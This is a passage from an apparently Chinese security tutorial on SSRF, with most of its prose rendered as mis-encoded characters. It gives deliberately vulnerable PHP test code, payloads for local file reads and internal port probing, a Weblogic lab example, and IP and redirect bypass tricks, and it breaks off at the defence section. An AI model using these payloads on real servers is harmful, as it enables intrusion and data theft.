</h1><p>SSRFæ¼æ´ç›¸å…³å‡½æ•°</p><blockquote><p><em>file_get_contents()</em> å°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p><em>readfile()</em> è¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</p><p><em>fsockopen()</em> æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚</p><p>curl_exec() æ‰§è¡Œä¸€ä¸ªcURLä¼šè¯,æˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseã€‚</p><p><em>curl_setopt</em>() å‡½æ•°å°†ä¸ºä¸€ä¸ªCURLä¼šè¯è®¾ç½®é€‰é¡¹ã€‚optionå‚æ•°æ˜¯ä½ æƒ³è¦çš„è®¾ç½®,valueæ˜¯è¿™ä¸ªé€‰é¡¹ç»™å®šçš„å€¼ã€‚</p></blockquote><ol><li><code>file_get_contents()</code>æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æµ‹è¯•ä»£ç ä¸­ï¼Œ<code>file_get_contents()</code> å‡½æ•°å°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ï¼Œæˆ‘ä»¬æ„é€ å¥½paylaodå³å¯è¯»å–æœåŠ¡å™¨æœ¬åœ°çš„ä»»æ„æ–‡ä»¶ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184537457.png" alt="image-20210401184537457"></p><p>ä¹Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹è®¿é—®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184635097.png" alt="image-20210401184635097"></p><p>readfile()å‡½æ•°ä¸filegetcontents()å‡½æ•°ç›¸ä¼¼ã€‚</p><ol start="2"><li><code>fsockopen() </code>æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> ç”¨äºæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ï¼Œåˆå§‹åŒ–ä¸€ä¸ªå¥—æ¥å­—è¿æ¥åˆ°æŒ‡å®šä¸»æœºï¼ˆhostnameï¼‰ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œè¿›è¡Œä¼ è¾“åŸå§‹æ•°æ®ã€‚fsockopen()å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨ï¼ˆä¾‹å¦‚ï¼šfgets()ï¼Œfgetss()ï¼Œfwrite()ï¼Œfclose()è¿˜æœ‰feof()ï¼‰ã€‚å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå°†è¿”å›falseã€‚</p><p>æ„é€  <code>ssrf.php?url=www.baidu.com</code> å³å¯æˆåŠŸè§¦å‘ssrfå¹¶è¿”å›ç™¾åº¦ä¸»é¡µï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401185335370.png" alt="image-20210401185335370"></p><p>ä½†æ˜¯è¯¥å‡½æ•°çš„SSRFæ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><ol start="3"><li><code>curl_exec() </code> æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();<span class="comment">//åˆå§‹åŒ–curlä¼šè¯</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);<span class="comment">//æŒ‡å®šè¯·æ±‚çš„url</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);<span class="comment">// å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚å‚æ•°ä¸º1è¡¨ç¤ºè¾“å‡ºä¿¡æ¯å¤´,ä¸º0è¡¨ç¤ºä¸è¾“å‡º</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤é¡µé¢çš„åŠŸèƒ½æ˜¯è·å–URLå‚æ•°ï¼Œç„¶åå°†URLçš„å†…å®¹æ˜¾ç¤ºåˆ°ç½‘é¡µé¡µé¢ä¸Šã€‚</p><p>åˆ©ç”¨ä¸Šé¢ç¼–å†™å¥½çš„SSRFæ¼æ´æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><ul><li>æ¢æµ‹ä¸€ä¸‹æœ¬åœ°æ˜¯å¦å­˜åœ¨mysqlæœåŠ¡å™¨</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331214657070.png" alt="image-20210331214657070"></p><p>å‡ºç°mysqlç›¸å…³çš„æç¤ºï¼Œè¯´æ˜è¿™ä¸ªæœåŠ¡å™¨ä¸Šå­˜åœ¨mysqlã€‚</p><blockquote><p>Tipsï¼šå¦‚æœå¯¹urlåç¼€æœ‰é™åˆ¶åˆ™å¯ä»¥ç”¨<code>?</code>æˆ–è€…<code>#</code>ç»•è¿‡ï¼Œå¦‚<code>http://localhost/ssrf/ssrf.php?url=127.0.0.1:3306/?.jpg</code></p></blockquote><ul><li>ä¼ªé€ è¯·æ±‚è®¿é—®ç™¾åº¦(ç”¨æœåŠ¡å™¨åšè·³æ¿è®¿é—®åˆ«çš„ç½‘ç«™)</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215034000.png" alt="image-20210331215034000"></p><ul><li>ä¼ªé€ è¯·æ±‚æ¢æµ‹æœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£</li></ul><p>å’Œç¬¬ä¸€ç‚¹ç›¸åŒï¼Œæ›´æ”¹ä¸åŒçš„ç«¯å£å·è¿›è¡Œéå†æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215235270.png" alt="image-20210331215235270"></p><ul><li>ä¼ªé€ è¯·æ±‚è¯»å–æœåŠ¡å™¨(å†…ç½‘)æ•æ„Ÿèµ„æ–™</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331220047359.png" alt="image-20210331220047359"></p><h1 id="SSRFæ¼æ´æµ‹è¯•"><a href="#SSRFæ¼æ´æµ‹è¯•" class="headerlink" title="SSRFæ¼æ´æµ‹è¯•"></a>SSRFæ¼æ´æµ‹è¯•</h1><p>æ¼æ´æµ‹è¯•é¶åœºï¼š<strong>vulhubä¹‹Weblogic SSRFæ¼æ´</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220238584.png" alt="image-20210401220238584"></p><p>SSRFæ¼æ´å­˜åœ¨äº<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8brupsuite%E4%B8%8B%E6%B5%8B%E8%AF%95%E8%AF%A5%E6%BC%8F%E6%B4%9E%E3%80%82%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84IP:PORT%EF%BC%8C%E5%A6%82http://127.0.0.1:7001%EF%BC%9A">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jspï¼Œæˆ‘ä»¬åœ¨brupsuiteä¸‹æµ‹è¯•è¯¥æ¼æ´ã€‚è®¿é—®ä¸€ä¸ªå¯ä»¥è®¿é—®çš„IP:PORTï¼Œå¦‚http://127.0.0.1:7001ï¼š</a></p><p>å¯è®¿é—®çš„ç«¯å£å°†ä¼šå¾—åˆ°é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯è¿”å›status codeï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå¦‚æœè®¿é—®çš„éhttpåè®®ï¼Œåˆ™ä¼šè¿”å›did not have a valid SOAP content-typeã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220537141.png" alt="image-20210401220537141"></p><p>ä¿®æ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ï¼Œå°†ä¼šè¿”å›could not connect over HTTP to serverã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220649022.png" alt="image-20210401220649022"></p><p>é€šè¿‡é”™è¯¯çš„ä¸åŒï¼Œå³å¯æ¢æµ‹å†…ç½‘çŠ¶æ€ã€‚</p><h1 id="SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•"><a href="#SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•"></a>SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•</h1><h2 id="SSRFæ¶‰åŠçš„åè®®"><a href="#SSRFæ¶‰åŠçš„åè®®" class="headerlink" title="SSRFæ¶‰åŠçš„åè®®"></a>SSRFæ¶‰åŠçš„åè®®</h2><ul><li>fileåè®®ï¼šåœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224611290.png" alt="image-20210401224611290"></p><ul><li>dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224503411.png" alt="image-20210401224503411"></p><ul><li>gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ï¼Œå¯ç”¨äºåå¼¹shell</li><li>http/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</li></ul><h2 id="SSRFå¸¸è§çš„ç§ç±»"><a href="#SSRFå¸¸è§çš„ç§ç±»" class="headerlink" title="SSRFå¸¸è§çš„ç§ç±»"></a>SSRFå¸¸è§çš„ç§ç±»</h2><ol><li>è¿œç¨‹ä¸‹è½½SSRFï¼šå¯ä»¥ç›´æ¥æ“çºµæœåŠ¡å™¨è¿œç¨‹ä¸‹è½½å…¶ä»–æœåŠ¡å™¨çš„èµ„æºï¼Œè¿™ç§å¯ä»¥å®Œå…¨å›æ˜¾æ‰€æœ‰ä¿¡æ¯ï¼Œå±å®³æœ€å¤§ã€‚</li><li>å¸ƒå°”å‹SSRFï¼šä¸ä¼šå›æ˜¾è¢«æ”»å‡»çš„å†…ç½‘ä¿¡æ¯ï¼Œæ˜¯æç¤ºtrueå’Œfalseï¼Œè¿™ç§å¯¹æ”»å‡»è€…æä¾›çš„ä¿¡æ¯è¾ƒå°‘ï¼Œä¸€èˆ¬åªèƒ½æ¢æµ‹å’Œç›²æ‰“ï¼Œåˆ©ç”¨ç‡ä¸é«˜ã€‚</li><li>æ— å›æ˜¾SSRFï¼šä¸å›æ˜¾ä»»ä½•ä¿¡æ¯çš„SSRFã€‚åªèƒ½é€šè¿‡dnslogåˆ¤æ–­ssrfæ˜¯å¦å­˜åœ¨ï¼Œæ— æ³•ç”¨æ¥æ¢æµ‹å†…ç½‘ï¼Œåªèƒ½é…åˆå…¶ä»–ä¿¡æ¯æ³„éœ²æ¥ç›²æ‰“å†…ç½‘ã€‚å•ç‹¬å­˜åœ¨æ²¡æœ‰å±å®³ã€‚</li></ol><h2 id="SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹"><a href="#SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹" class="headerlink" title="SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹"></a>SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹</h2><ol><li><p>ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</p></li><li><p>è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</p></li><li><p>åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</p></li><li><p>å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p></li><li><p>å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ</p></li><li><p>äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•</p></li><li><p>ç½‘ç«™é‡‡é›†ã€ç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</p></li><li><p>æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</p></li><li><p>é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</p></li><li><p>ç¼–ç å¤„ç†ã€å±æ€§ä¿¡æ¯å¤„ç†ã€æ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</p></li><li><p>æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´</p><p>ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</p></li><li><p>ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰</p></li></ol><h2 id="SSRFæ¼æ´éªŒè¯æ–¹æ³•"><a href="#SSRFæ¼æ´éªŒè¯æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´éªŒè¯æ–¹æ³•"></a>SSRFæ¼æ´éªŒè¯æ–¹æ³•</h2><ol><li>æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚</li></ol><p>æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</a></p><ol start="2"><li>dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—®</li></ol><p>â€“å¯ä»¥åœ¨ç›²æ‰“åå°ç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„uri å’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚ã€‚</p><ol start="3"><li>æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ï¼Œæ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€</li></ol><p>â€“ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€</p><p>â€“é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€</p><ol start="4"><li>ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯</li><li>ç•™æ„boolå‹SSRF</li></ol><h2 id="SSRFç»•è¿‡å§¿åŠ¿"><a href="#SSRFç»•è¿‡å§¿åŠ¿" class="headerlink" title="SSRFç»•è¿‡å§¿åŠ¿"></a>SSRFç»•è¿‡å§¿åŠ¿</h2><blockquote><p>æ›´å¤šè§ <a href="https://www.secpulse.com/archives/65832.html">SSRFç»•è¿‡æ–¹æ³•æ€»ç»“</a> ã€å‚è€ƒèµ„æ–™[3]</p></blockquote><ol><li><p>è¿›åˆ¶çš„è½¬æ¢ç»•è¿‡å†…ç½‘IP</p><p>å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸åŒçš„è¿›åˆ¶æ›¿ä»£ipåœ°å€ï¼Œä»è€Œç»•è¿‡WAFã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ 127.0.0.1</span><br><span class="line">8è¿›åˆ¶ï¼š0177.0.0.1</span><br><span class="line">16è¿›åˆ¶ï¼š0x7f.0.0.1</span><br><span class="line">10è¿›åˆ¶ï¼š2130706433</span><br></pre></td></tr></table></figure><p>å…¶ä»–å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€</p><blockquote><p><a href="http://localhost/">http://localhost/</a>         # localhostå°±æ˜¯ä»£æŒ‡127.0.0.1</p><p><a href="http://0.0.0.0/">http://0/</a>                 # 0åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1</p><p><a href="http://0.0.0.0/">http://0.0.0.0/</a>       # 0.0.0.0è¿™ä¸ªIPåœ°å€è¡¨ç¤ºæ•´ä¸ªç½‘ç»œï¼Œå¯ä»¥ä»£è¡¨æœ¬æœº ipv4 çš„æ‰€æœ‰åœ°å€http://[0:0:0:0:0:ffff:127.0.0.1]/    # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</p><p>http://[::]:80/           # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</p><p><a href="http://127.0.0.1/">http://127ã€‚0ã€‚0ã€‚1/</a>       # ç”¨ä¸­æ–‡å¥å·ç»•è¿‡</p><p>http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </p><p><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0çš„æ•°é‡å¤šä¸€ç‚¹å°‘ä¸€ç‚¹éƒ½æ²¡å½±å“ï¼Œæœ€åè¿˜æ˜¯ä¼šæŒ‡å‘127.0.0.1</p></blockquote></li><li><p>åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡</p><p>å¦‚æœç›®æ ‡ä»£ç é™åˆ¶è®¿é—®çš„åŸŸååªèƒ½ä¸º <a href="http://www.xxx.com/">http://www.xxx.com</a> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼š<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p></li><li><p>åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP</p></li></ol><p>ï¼ˆ1ï¼‰ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œç½‘å€ä¸º <a href="http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š">http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š</a></p><p>å½“æˆ‘ä»¬è®¿é—®ï¼š<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> æ—¶ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> ã€‚åƒè¿™ç§ç½‘å€è¿˜æœ‰<a href="http://nip.io,http//sslip.io">http://nip.ioï¼Œhttp://sslip.io</a> ã€‚</p><p>å¦‚ä¸‹ç¤ºä¾‹ï¼ˆflag.phpä»…èƒ½ä»æœ¬åœ°è®¿é—®ï¼‰ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203614705.png" alt="image-20210401203614705"></p><p>ï¼ˆ2ï¼‰çŸ­åœ°å€è·³è½¬ç»•è¿‡ï¼Œè¿™é‡Œä¹Ÿç»™å‡ºä¸€ä¸ªç½‘å€ <a href="https://4m.cn/%EF%BC%9A">https://4m.cn/ï¼š</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203936903.png" alt="image-20210401203936903"></p><p>ç›´æ¥ä½¿ç”¨ç”Ÿæˆçš„çŸ­è¿æ¥ <a href="https://4m.cn/FjOdQ%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8302%E8%B7%B3%E8%BD%AC%E5%88%B0">https://4m.cn/FjOdQå°±ä¼šè‡ªåŠ¨302è·³è½¬åˆ°</a> <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡WAFäº†ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401204144651.png" alt="image-20210401204144651"></p><h1 id="SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•"><a href="#SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•"></a>SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•</h1><p>é€šè¿‡ä¸Šé¢çš„çŸ¥é“äº†SSRFæ¼æ´æœ€å¤§çš„æˆå› æ˜¯URLå®Œå…¨å¯æ§ï¼ŒæœåŠ¡å™¨ä¼šå¯¹ç”¨æˆ·æ„é€ çš„URLè¿›è¡Œå“åº”ï¼Œæ‰€ä»¥ä»é˜²å¾¡æ–¹é¢æ¥çœ‹æˆ‘ä»¬è¦ç¦æ­¢æœåŠ¡å™¨éšæ„å“åº”ç”¨æˆ·æ„é€ 